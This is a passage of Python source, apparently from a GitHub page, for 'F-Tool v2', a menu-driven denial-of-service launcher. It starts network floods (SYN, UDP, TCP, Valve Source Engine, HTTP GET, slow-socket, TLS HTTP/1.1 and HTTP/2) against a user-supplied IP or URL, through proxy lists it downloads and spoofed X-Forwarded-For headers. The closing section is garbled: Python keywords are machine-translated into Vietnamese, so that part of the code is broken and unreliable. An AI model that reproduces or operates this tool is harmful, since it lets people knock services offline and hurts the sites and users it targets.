  _\ \ |_) |  __/  __/ (_| |/ / |  __/\__ \ |_
  \__/ .__/ \___|\___|\__,_|\/   \___||___/\__|
     |_|
""")
		try:
			spdt = speedtest.Speedtest()

			print(Color.LC+"[*] Loading Server List...")
			spdt.get_servers()
			time.sleep(0.1)

			print(Color.LC+"[*] Choosing Best Server...")
			get = spdt.get_best_server()
			time.sleep(0.1)

			print(Color.LC+"\n[+] "+Color.LC+"Host:"+Color.LY+f" {get['host']}")
			time.sleep(0.1)
			print(Color.LC+"[+] "+Color.LC+"Location:"+Color.LY+f" {get['name']}")

			print(Color.LC+"\n[*] Performing Download Test...")
			download_result = spdt.download()

			print(Color.LC+"[*] Performing Upload Test...")
			upload_result = spdt.upload()
			ping_result = spdt.results.ping

			time.sleep(0.1)
			print(Color.LC+"\nResults:\n")
			time.sleep(0.1)
			print(Color.LC+"[+] Download Speed:"+Color.LY+f" {download_result / 1024 / 1024:.2f} mbps")
			time.sleep(0.1)
			print(Color.LC+"[+] Upload Speed:"+Color.LY+f" {upload_result / 1024 / 1024:.2f} mbps")
			time.sleep(0.1)
			print(Color.LC+"[+] Ping:"+Color.LY+f" {ping_result:.2f} ms")
			print("\n")
		except Exception:
			print(Color.LR+"Error: Check your Internet Connection.\n\n")


	def bbos(self):
		print(Color.LR+"\n\n    [>    "+Color.LG+"Please use spoofed server for the best experience."+Color.LR+"    <]\n\n")
		print(Color.LR+"["+Color.LG+"01"+Color.LR+"]"+Color.LC+" Layer4")
		print(Color.LR+"["+Color.LG+"02"+Color.LR+"]"+Color.LC+" Layer7")
		print("\n")
		while True:
			sys.stdout.write(Color.LB+"‚ïî‚ïê‚ïê‚ïê"+Color.LR+"["+Color.LG+"F-Toolv2"+Color.LB+"@"+Color.LG+"L4/L7/BBoS"+Color.LR+"]"+Color.LB+"\n‚ïö‚ïê‚ïê> "+Color.RESET)
			option = input()
			if option == '01' or option == '1':
				os.system('clear');self.l4()
			elif option == '02' or option == '2':
				os.system('clear');self.l7()
			elif option == 'ref' or option == 'REF':
				self.bbos()
			elif option == 'home' or option == 'HOME':
				F_Tool.home()
			elif option == 'clear' or option == 'CLEAR':
				os.system('clear')
				self.bbos()
			elif option == 'help' or option == 'HELP':
				print(self.help)
			elif option == 'dev' or option == 'DEV':
				print(self.dev)
			elif option == 'exit' or option == 'EXIT':
				subprocess.run(['pkill -f F-Tool.py'], shell=True)
			elif option == 'stop' or option == 'STOP':
				subprocess.run(['pkill screen'], shell=True)
				print(f"{Color.LG} [!] Attack Stopped!")
			elif option == "":
				pass
			else:
				print(Color.LR+"command: "+Color.LG+f"{option}"+Color.LR+" not found")

	def l4(self):
		print(f"""{Color.LG}
     __                       _  _
    / /  __ _ _   _  ___ _ __| || |
   / /  / _` | | | |/ _ \ '__| || |_
  / /__| (_| | |_| |  __/ |  |__   _|
  \____/\__,_|\__, |\___|_|     |_|
              |___/
""")
		print(Color.LR+"["+Color.LG+"01"+Color.LR+"]"+Color.LC+" VSE: UDP Valve Source Engine specific flood")
		print(Color.LR+"["+Color.LG+"02"+Color.LR+"]"+Color.LC+" SYN: TCP SYN flood")
		print(Color.LR+"["+Color.LG+"03"+Color.LR+"]"+Color.LC+" TCP: TCP junk flood")
		print(Color.LR+"["+Color.LG+"04"+Color.LR+"]"+Color.LC+" UDP:  UDP junk flood")
		print(Color.LR+"["+Color.LG+"05"+Color.LR+"]"+Color.LC+" HTTP: HTTP GET request flood")
		print(Color.LR+"["+Color.LG+"00"+Color.LR+"]"+Color.LC+" Return")
		print("\n")
		while True:
			sys.stdout.write(Color.LB+"‚ïî‚ïê‚ïê‚ïê"+Color.LR+"["+Color.LG+"F-Toolv2"+Color.LB+"@"+Color.LG+"Layer4"+Color.LR+"]"+Color.LB+"\n‚ïö‚ïê‚ïê> "+Color.RESET)
			option = input()
			if option == '01' or option == '1':
				try:
					ip = str(input(f"{Color.LG} [>] IP: "+Color.RESET))
					port = int(input(f"{Color.LG} [>] Port: "+Color.RESET))
					floodtime = int(input(f"{Color.LG} [>] Time: "+Color.RESET))
					thread = int(input(f"{Color.LG} [>] Thread: "+Color.RESET))
					subprocess.run([f'screen -dm python3 utils/L4/vse {ip} {port} {floodtime} {thread}'], shell=True)
					print(Color.LG+f"\n [!] Attack sent successfully!\n")
				except:
					print(f"{Color.LR}ERROR: {Color.RESET}Try again")
			elif option == '02' or option == '2':
				try:
					ip = str(input(f"{Color.LG} [>] IP: "+Color.RESET))
					port = int(input(f"{Color.LG} [>] Port: "+Color.RESET))
					floodtime = int(input(f"{Color.LG} [>] Time: "+Color.RESET))
					thread = int(input(f"{Color.LG} [>] Thread: "+Color.RESET))
					subprocess.run([f'screen -dm python3 utils/L4/syn {ip} {port} {floodtime} {thread}'], shell=True)
					print(Color.LG+f"\n [!] Attack sent successfully!\n")
				except:
					print(f"{Color.LR}ERROR: {Color.RESET}Try again")
			elif option == '03' or option == '3':
				try:
					ip = str(input(f"{Color.LG} [>] IP: "+Color.RESET))
					port = int(input(f"{Color.LG} [>] Port: "+Color.RESET))
					floodtime = int(input(f"{Color.LG} [>] Time: "+Color.RESET))
					size = int(input(f"{Color.LG} [>] Size: "+Color.RESET))
					thread = int(input(f"{Color.LG} [>] Thread: "+Color.RESET))
					subprocess.run([f'screen -dm python3 utils/L4/tcp {ip} {port} {floodtime} {size} {thread}'], shell=True)
					print(Color.LG+f"\n [!] Attack sent successfully!\n")
				except:
					print(f"{Color.LR}ERROR: {Color.RESET}Try again")
			elif option == '04' or option == '4':
				try:
					ip = str(input(f"{Color.LG} [>] IP: "+Color.RESET))
					port = int(input(f"{Color.LG} [>] Port: "+Color.RESET))
					floodtime = int(input(f"{Color.LG} [>] Time: "+Color.RESET))
					size = int(input(f"{Color.LG} [>] Size: "+Color.RESET))
					thread = int(input(f"{Color.LG} [>] Thread: "+Color.RESET))
					subprocess.run([f'screen -dm python3 utils/L4/udp {ip} {port} {floodtime} {size} {thread}'], shell=True)
					print(Color.LG+f"\n [!] Attack sent successfully!\n")
				except:
					print(f"{Color.LR}ERROR: {Color.RESET}Try again")
			elif option == '05' or option == '5':
				try:
					ip = str(input(f"{Color.LG} [>] IP: "+Color.RESET))
					port = int(input(f"{Color.LG} [>] Port: "+Color.RESET))
					floodtime = int(input(f"{Color.LG} [>] Time: "+Color.RESET))
					thread = int(input(f"{Color.LG} [>] Thread: "+Color.RESET))
					subprocess.run([f'screen -dm python3 utils/L4/http {ip} {port} {floodtime} {thread}'], shell=True)
					print(Color.LG+f"\n [!] Attack sent successfully!\n")
				except:
					print(f"{Color.LR}ERROR: {Color.RESET}Try again")
			elif option == 'ref' or option == 'REF':
				self.l4()
			elif option == 'home' or option == 'HOME':
				F_Tool.home()
			elif option == 'clear' or option == 'CLEAR':
				os.system('clear')
				self.l4()
			elif option == 'help' or option == 'HELP':
				print(self.help)
			elif option == 'dev' or option == 'DEV':
				print(self.dev)
			elif option == 'exit' or option == 'EXIT':
				subprocess.run(['pkill -f F-Tool.py'], shell=True)
			elif option == 'stop' or option == 'STOP':
				subprocess.run(['pkill screen'], shell=True)
				print(f"{Color.LG} [!] Attack Stopped!")
			elif option == '00' or option == '0':
				os.system('clear');self.bbos()
			elif option == "":
				pass
			else:
				print(Color.LR+"command: "+Color.LG+f"{option}"+Color.LR+" not found")

	def l7(self):
		print(f"""{Color.LG}
     __                      _____
    / /  __ _ _   _  ___ _ _|___  |
   / /  / _` | | | |/ _ \ '__| / /
  / /__| (_| | |_| |  __/ |   / /
  \____/\__,_|\__, |\___|_|  /_/
              |___/
""")
		print(Color.LR+"["+Color.LG+"01"+Color.LR+"]"+Color.LC+" SOCKET: Slow HTTP/1.1 socket flood (JS)")
		print(Color.LR+"["+Color.LG+"02"+Color.LR+"]"+Color.LC+" HTTP1: TLS HTTP/1.1 GET flood (JS)")
		print(Color.LR+"["+Color.LG+"03"+Color.LR+"]"+Color.LC+" HTTP2: TLS HTTP/2 GET flood (JS)")
		print(Color.LR+"["+Color.LG+"04"+Color.LR+"]"+Color.LC+" CRINGE: Powerful Method Target Maybe die from Cringe (JS)")
		print(Color.LR+"["+Color.LG+"00"+Color.LR+"]"+Color.LC+" Return")
		print("\n")
		http_proxy = "https://api.proxyscrape.com/v2/?request=displayproxies&protocol=http&timeout=10000&country=all&ssl=all&anonymity=all"
		while True:
			sys.stdout.write(Color.LB+"‚ïî‚ïê‚ïê‚ïê"+Color.LR+"["+Color.LG+"F-Toolv2"+Color.LB+"@"+Color.LG+"Layer7"+Color.LR+"]"+Color.LB+"\n‚ïö‚ïê‚ïê> "+Color.RESET)
			option = input()
			if option == '01' or option == '1':
				try:
					url = str(input(f"{Color.LG} [>] URL: "+Color.RESET))
					floodtime = int(input(f"{Color.LG} [>] Time: "+Color.RESET))
					reqs = int(input(f"{Color.LG} [>] Reqs(200): "+Color.RESET))
					F_Tool.styleText("\n [*] Downloading Proxy...\n")
					with open("utils/http.txt", 'w') as p:
						p.write(httpx.get(http_proxy).text)
					subprocess.run([f'screen -dm node utils/L7/socket {url} utils/http.txt {floodtime} {reqs}'], shell=True)
					print(Color.LG+f"\n [!] Attack sent successfully!\n")
				except:
					print(f"{Color.LR}ERROR: {Color.RESET}Try again")
			elif option == '02' or option == '2':
				try:
					url = str(input(f"{Color.LG} [>] URL: "+Color.RESET))
					floodtime = int(input(f"{Color.LG} [>] Time: "+Color.RESET))
					F_Tool.styleText("\n [*] Downloading Proxy...\n")
					with open("utils/http.txt", 'w') as p:
						p.write(httpx.get(http_proxy).text)
					subprocess.run([f'screen -dm node utils/L7/https1 GET {url} utils/http.txt {floodtime} 64 1'], shell=True)
					print(Color.LG+f"\n [!] Attack sent successfully!\n")
				except:
					print(f"{Color.LR}ERROR: {Color.RESET}Try again")
			elif option == '03' or option == '3':
				try:
					url = str(input(f"{Color.LG} [>] URL: "+Color.RESET))
					floodtime = int(input(f"{Color.LG} [>] Time: "+Color.RESET))
					F_Tool.styleText("\n [*] Downloading Proxy...\n")
					with open("utils/http.txt", 'w') as p:
						p.write(httpx.get(http_proxy).text)
					subprocess.run([f'screen -dm node utils/L7/https2 {url} {floodtime} 1'], shell=True)
					print(Color.LG+f"\n [!] Attack sent successfully!\n")
				except:
					print(f"{Color.LR}ERROR: {Color.RESET}Try again")
			elif option == '04' or option == '4':
				try:
					url = str(input(f"{Color.LG} [>] URL: "+Color.RESET))
					floodtime = int(input(f"{Color.LG} [>] Time: "+Color.RESET))
					F_Tool.styleText("\n [*] Downloading Proxy...\n")
					with open("utils/http.txt", 'w') as p:
						p.write(httpx.get(http_proxy).text)
					subprocess.run([f'screen -dm node utils/L7/bypass {url} {floodtime}'], shell=True)
					print(Color.LG+f"\n [!] Attack sent successfully!\n")
				except:
					print(f"{Color.LR}ERROR: {Color.RESET}Try again")
			elif option == 'ref' or option == 'REF':
				self.l7()
			elif option == 'home' or option == 'HOME':
				F_Tool.home()
			elif option == 'clear' or option == 'CLEAR':
				os.system('clear')
				self.l7()
			elif option == 'help' or option == 'HELP':
				print(self.help)
			elif option == 'dev' or option == 'DEV':
				print(self.dev)
			elif option == 'exit' or option == 'EXIT':
				subprocess.run(['pkill -f F-Tool.py'], shell=True)
			elif option == 'stop' or option == 'STOP':
				subprocess.run(['pkill screen'], shell=True)
				print(f"{Color.LG} [!] Attack Stopped!")
			elif option == '00' or option == '0':
				os.system('clear');self.bbos()
			elif option == "":
				pass
			else:
				print(Color.LR+"command: "+Color.LG+f"{option}"+Color.LR+" not found")


def spoof_useragents():
	spoof_ip = []
	ip = []
	ip1, ip2, ip3, ip4 = random.randint(1,255), random.randint(1,255), random.randint(1,255), random.randint(1,255)
	ip.append(ip1), ip.append(ip2), ip.append(ip3), ip.append(ip4)

	IP = str(ip[0])+"."+str(ip[1])+"."+str(ip[2])+"."+str(ip[3])
	spoof_ip.append(IP)

	useragents = ['Mozilla/4.0 (Compatible; MSIE 8.0; Windows NT 5.2; Trident/6.0)',
	'Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:16.0.1) Gecko/20121011 Firefox/21.0.1',
	'Mozilla/5.0 (Windows NT 6.3; rv:36.0) Gecko/20100101 Firefox/36.0',
	'Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko)',
	'Chrome/34.0.1847.116 Safari/537.36',
	'Mozilla/5.0 (iPad; U; CPU OS 3_2 like Mac OS X; en-us) AppleWebKit/531.21.10 (KHTML, like Gecko) Version/4.0.4 Mobile/7B334b Safari/531.21.10',
	'Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:16.0.1) Gecko/20121011 Firefox/21.0.1',
	'Mozilla / 5.0 (Windows; U; Windows NT 5.1; ja-JP) AppleWebKit / 533.20.25 (KHTML, nh∆∞ Gecko) Phi√™n b·∫£n / 5.0.3 Safari / 533.19.4' ,
	'Mozilla / 5.0 (Windows; U; Windows NT 6.1; en-US; rv: 1.9.2.13) Gecko / 20101213 Opera / 9.80 (Windows NT 6.1; U; zh-tw) Phi√™n b·∫£n Presto / 2.7.62 / 11.01' ]

	tr·ªü l·∫°i {
	'K·∫øt n·ªëi' : 'Keep-Alive' ,
	'Cache-control' : 'no-cache' ,
	'T√°c nh√¢n ng∆∞·ªùi d√πng' : ng·∫´u nhi√™n . s·ª± l·ª±a ch·ªçn ( useragents ). d·∫£i (),
	'X-Forwarded-For' : ng·∫´u nhi√™n . l·ª±a ch·ªçn ( spoof_ip )
	}

def  main ():
	# ki·ªÉm tra xem b·∫°n c√≥ ph·∫£i l√† ng∆∞·ªùi ƒë·ªìng t√≠nh kh√¥ng üòè
	F_Tool . styleText ( "[+] Ki·ªÉm tra s·ª± ph·ª• thu·ªôc ... \ n \ n " )
	pkgs  = [ 'screen' , 'node' ]
	c√†i ƒë·∫∑t  =  ƒê√∫ng
	cho  pkg t√≠nh  b·∫±ng  pkgs :
		ur_mom  =  which ( pkg )
		if  ur_mom  ==  Kh√¥ng c√≥ :
			F_Tool . styleText ( f "[!] { pkg } ch∆∞a ƒë∆∞·ª£c c√†i ƒë·∫∑t! \ n " )
			c√†i ƒë·∫∑t  =  Sai
		kh√°c :
			ƒëi qua
	n·∫øu  c√†i ƒë·∫∑t  ==  Sai :
		sys . exit ( f ' \ n [?] L·ªói? h√£y th·ª≠: { Color . LG } sh install.sh' )
	kh√°c : v∆∞·ª£t qua
	th·ª≠ :
		script  =  True
		v·ªõi  open ( 'utils' ) l√†  quan tr·ªçng : v∆∞·ª£t qua
	ngo·∫°i tr·ª´  IsADirectoryError : v∆∞·ª£t qua
	ngo·∫°i tr·ª´  FileNotFoundError :
		print ( f " { Color . LR } [CRITICAL ERROR]: { Color . RESET } T·ªáp: 'utils' NotFound" )
		print ( " \ n [+] Vui l√≤ng t·∫£i xu·ªëng tr√™n GitHub ho·∫∑c git clone: ‚Äã‚Äãhttps://github.com/FDc0d3/F-Tool.git \ n " )
		h·ªá ƒëi·ªÅu h√†nh . lo·∫°i b·ªè ( f ' { __file__ } ' )
		script  =  Sai
	if  script  ==  Sai : sys . tho√°t ra ()
	kh√°c : v∆∞·ª£t qua
	F_Tool . nh√† ()


n·∫øu  __name__  ==  '__main__' :
	L·ªánh  =  f "" " { M√†u . LC } HOME { M√†u . LR } ~> { M√†u . LY } Quay l·∫°i trang ch·ªß
{ M√†u s·∫Øc . LC } REF { M√†u . LR } ~> { M√†u s·∫Øc . LY } L√†m m·ªõi menu
{ M√†u s·∫Øc . LC } CLEAR { M√†u . LR } ~> { M√†u s·∫Øc . LY } X√≥a khu√¥n m·∫∑t c·ªßa b·∫°n xd
{ M√†u s·∫Øc . LC } EXIT { M√†u . LR } ~> { M√†u s·∫Øc . LY } Tho√°t kh·ªèi ch∆∞∆°ng tr√¨nh
{ M√†u s·∫Øc . LC } STOP { M√†u . LR } ~> { M√†u s·∫Øc . LY } D·ª´ng cu·ªôc t·∫•n c√¥ng c·ªßa b·∫°n
{ M√†u s·∫Øc . LC } DEV { M√†u s·∫Øc . LR } ~> { M√†u s·∫Øc . LY } Li√™n h·ªá / H·ªó tr·ª£ nh√† ph√°t tri·ªÉn "" "
	dev  =  f "" " { Color . LC } Telegram { Color . LR } : { Color . LY } https://t.me/FDc0d3
{ M√†u s·∫Øc . LC } ƒê·ªãa ch·ªâ [BTC] m·ªõi { M√†u . LR } : { M√†u s·∫Øc . LY } 32FGCnt4uwkkByWuH8V4qyCSfynm1iVsmB "" "
	F_Tool  =  Trang ch·ªß ( l·ªánh , nh√† ph√°t tri·ªÉn )
	Tool  =  C√¥ng c·ª• ( l·ªánh , nh√† ph√°t tri·ªÉn , spoof_useragents ())
	main ()
Ch√¢n trang
¬© 2022 GitHub, Inc.
ƒêi·ªÅu h∆∞·ªõng ch√¢n trang
ƒêi·ªÅu ki·ªán
S·ª± ri√™ng t∆∞
B·∫£o v·ªá
Tr·∫°ng th√°i
Docs
Li√™n h·ªá v·ªõi GitHub
ƒê·ªãnh gi√°
API
T·∫≠p hu·∫•n
Blog
V·ªÅ
